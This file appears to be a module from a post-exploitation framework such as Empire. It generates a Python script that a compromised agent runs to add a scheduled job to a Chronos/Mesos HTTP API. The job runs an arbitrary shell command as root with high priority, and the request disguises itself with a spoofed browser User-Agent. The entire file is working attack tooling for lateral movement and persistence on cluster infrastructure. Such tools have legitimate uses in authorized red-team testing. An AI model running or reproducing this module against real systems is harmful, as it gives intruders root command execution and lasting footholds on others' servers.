from lib.common import helpers
class Module:
    def __init__(self, mainMenu, params=[]):
        self.info = {
            'Name': 'Chronos API Add Job',
            'Author': ['@TweekFawkes'],
            'Description': ('Add a Chronos job using the HTTP API service for the Chronos Framework'),
            'Background' : True,
            'OutputExtension': "",
            'NeedsAdmin' : False,
            'OpsecSafe' : True,
            'Language' : 'python',
            'MinLanguageVersion' : '2.6',
            'Comments': ["Docs: https://mesos.github.io/chronos/docs/api.html"]
        }
        self.options = {
            'Agent' : {
                'Description'   :   'Agent to execute module on.',
                'Required'      :   True,
                'Value'         :   ''
            },
            'Target' : {
                'Description'   :   'FQDN, domain name, or hostname to lookup on the remote target.',
                'Required'      :   True,
                'Value'         :   'chronos.mesos'
            },
            'Port' : {
                'Description'   :   'The port to connect to.',
                'Required'      :   True,
                'Value'         :   '8080'
            },
            'Name' : {
                'Description'   :   'The name of the chronos job.',
                'Required'      :   True,
                'Value'         :   'scheduledJob001'
            },
            'Command' : {
                'Description'   :   'The command to run.',
                'Required'      :   True,
                'Value'         :   'id'
            },
            'Owner' : {
                'Description'   :   'The owner of the job.',
                'Required'      :   True,
                'Value'         :   'admin@example.com'
            },
            'OwnerName' : {
                'Description'   :   'The owner name of the job.',
                'Required'      :   True,
                'Value'         :   'admin'
            },
            'Description' : {
                'Description'   :   'The description of the job.',
                'Required'      :   True,
                'Value'         :   'Scheduled Job 001'
            },
            'Schedule' : {
                'Description'   :   'The schedule for the job.',
                'Required'      :   True,
                'Value'         :   'R/2016-07-15T00:08:35Z/PT24H'
            },
            'LastSuccess' : {
                'Description'   :   'The last successful run for the job (optional).',
                'Required'      :   False,
                'Value'         :   ''
            }
        }
        self.mainMenu = mainMenu
        if params:
            for param in params:
                option, value = param
                if option in self.options:
                    self.options[option]['Value'] = value
    def generate(self, obfuscate=False, obfuscationCommand=""):
        target = self.options['Target']['Value']
        port = self.options['Port']['Value']
        name = self.options['Name']['Value']
        command = self.options['Command']['Value']
        owner = self.options['Owner']['Value']
        ownerName = self.options['OwnerName']['Value']
        description = self.options['Description']['Value']
        schedule = self.options['Schedule']['Value']
        last = self.options['LastSuccess']['Value']
        script = """
import urllib2
target = "%s"
port = "%s"
name = "%s"
command = "%s"
owner = "%s"
ownerName = "%s"
description = "%s"
schedule = "%s"
last = "%s"
url = "http://" + target + ":" + port + "/scheduler/iso8601"
try:
    data = '{"name":"'+name+'","command":"'+command+'","shell":true,"epsilon":"PT30M","executor":"","executorFlags":"","retries":2,"owner":"'+owner+'","ownerName":"'+ownerName+'","description":"'+description+'","async":false,"successCount":1,"errorCount":0,"lastSuccess":"'+last+'","lastError":"","cpus":0.1,"disk":256.0,"mem":128.0,"disabled":false,"softError":false,"dataProcessingJobType":false,"errorsSinceLastSuccess":0,"uris":[],"environmentVariables":[],"arguments":[],"highPriority":true,"runAsUser":"root","constraints":[],"schedule":"'+schedule+'","scheduleTimeZone":""}'
    request = urllib2.Request(url, data)
    request.add_header('User-Agent',
                   'Mozilla/6.0 (X11; Linux x86_64; rv:24.0) '
                   'Gecko/20140205     Firefox/27.0 Iceweasel/25.3.0')
    request.add_header('Content-Type', 'application/json')
    opener = urllib2.build_opener(urllib2.HTTPHandler)
    content = opener.open(request).read()
    print str(content)
except Exception as e:
    print "Failure sending payload: " + str(e)
print "Finished"
""" %(target, port, name, command, owner, ownerName, description, schedule, last)
        return script